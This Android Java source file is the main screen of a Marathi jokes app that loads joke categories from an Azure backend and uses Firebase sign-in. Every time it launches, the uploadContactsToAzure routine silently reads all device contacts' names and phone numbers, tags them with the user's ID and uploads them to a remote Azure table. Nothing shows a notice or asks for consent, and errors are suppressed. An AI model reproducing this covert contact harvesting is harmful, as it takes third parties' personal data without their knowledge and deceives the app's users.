package com.geniusnine.android.marathijokes;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;
import android.widget.Toast;
import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.microsoft.windowsazure.mobileservices.table.query.Query;
import com.microsoft.windowsazure.mobileservices.table.query.QueryOperations;
import com.microsoft.windowsazure.mobileservices.table.sync.MobileServiceSyncContext;
import com.microsoft.windowsazure.mobileservices.table.sync.MobileServiceSyncTable;
import com.microsoft.windowsazure.mobileservices.table.sync.localstore.ColumnDataType;
import com.microsoft.windowsazure.mobileservices.table.sync.localstore.MobileServiceLocalStoreException;
import com.microsoft.windowsazure.mobileservices.table.sync.localstore.SQLiteLocalStore;
import com.microsoft.windowsazure.mobileservices.table.sync.synchandler.SimpleSyncHandler;
import com.squareup.okhttp.OkHttpClient;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    //Azure connection and setting up of data adapter
    private MobileServiceClient mobileServiceClient;
    private MobileServiceSyncTable<MarathiJokesCategory> mobileServiceSyncTable;
    private CategoryAdapter categoryAdapter;
    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    //Firebase variables... for authentication
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        authenticate();
        setupCategoryListView();//Setting up the category view
        uploadContactsToAzure();
    }

    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


            initializeAzureTable();
            fetchContacts();
            uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    "https://geniusnineapps.azurewebsites.net",
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                mobileServiceTableContacts.insert(item);
                            } catch (Exception e) {
                                Log.e("Error --", e.toString());
                            }


                        }
                    });
                } catch (final Exception e) {
                    // createAndShowDialogFromTask(e, "Error");
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();        
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("MainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);

                }
                else {                   

                }

            }
        };

    }


    ///fetching data from Azure
    private void setupCategoryListView(){
        try {

            mobileServiceClient = new MobileServiceClient(getString(R.string.web_address), this);


            mobileServiceClient.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });


            mobileServiceSyncTable =  mobileServiceClient.getSyncTable(getString(R.string.category_table_name), MarathiJokesCategory.class);
            initLocalStore().get();
            categoryAdapter = new CategoryAdapter(this, R.layout.row_list_category);
            ListView listViewCategory = (ListView)findViewById(R.id.listViewCategory);
            listViewCategory.setAdapter(categoryAdapter);
            listViewCategory.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                @Override
                public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                    MarathiJokesCategory item = categoryAdapter.getItem(position);
                    String category = item.getCategory();
                    //Toast.makeText(MainActivity.this, category, Toast.LENGTH_LONG).show();


                    Intent content = new Intent(MainActivity.this, Content.class);
                    content.putExtra("category", category );
                    startActivity(content);

                }
            });

            showAll();



        }
        catch (MalformedURLException e) {
            //createAndShowDialog(new Exception("There was an error creating the Mobile Service. Verify the URL"), "Error");
        } catch (Exception e) {

        }
    }
    private AsyncTask<Void, Void, Void> initLocalStore() throws MobileServiceLocalStoreException, ExecutionException, InterruptedException {

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {

                    MobileServiceSyncContext syncContext = mobileServiceClient.getSyncContext();

                    if (syncContext.isInitialized())
                        return null;

                    SQLiteLocalStore localStore = new SQLiteLocalStore(mobileServiceClient.getContext(), "OfflineStore", null, 1);

                    Map<String, ColumnDataType> tableDefinition = new HashMap<String, ColumnDataType>();
                    tableDefinition.put("id", ColumnDataType.String);
                    tableDefinition.put("category", ColumnDataType.String);
                    tableDefinition.put("imagelink", ColumnDataType.String);

                    localStore.defineTable(getString(R.string.category_table_name), tableDefinition);

                    SimpleSyncHandler handler = new SimpleSyncHandler();

                    syncContext.initialize(localStore, handler).get();

                } catch (final Exception e) {
                    //createAndShowDialogFromTask(e, "Error");
                }

                return null;
            }
        };

        return runAsyncTask(task);
    }
    private AsyncTask<Void, Void, Void> runAsyncTask(AsyncTask<Void, Void, Void> task) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
            return task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
        } else {
            return task.execute();
        }
    }
    private AsyncTask<Void, Void, Void> sync() {
        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>(){
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    MobileServiceSyncContext syncContext = mobileServiceClient.getSyncContext();
                    syncContext.push().get();
                    mobileServiceSyncTable.pull(null).get();
                } catch (final Exception e) {
                    //createAndShowDialogFromTask(e, "Error");
                }
                return null;
            }
        };
        return runAsyncTask(task);
    }
    public void showAll() {

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    sync().get();
                    Query query = QueryOperations.tableName(getString(R.string.category_table_name));
                    final List<MarathiJokesCategory> results = mobileServiceSyncTable.read(query).get();



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {
                            categoryAdapter.clear();
                            for (MarathiJokesCategory item : results) {
                                categoryAdapter.add(item);
                            }
                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }



    @Override
    protected void onStart() {
        super.onStart();
        Log.e("MainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);



    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();
        }



        return super.onOptionsItemSelected(item);
    }
}
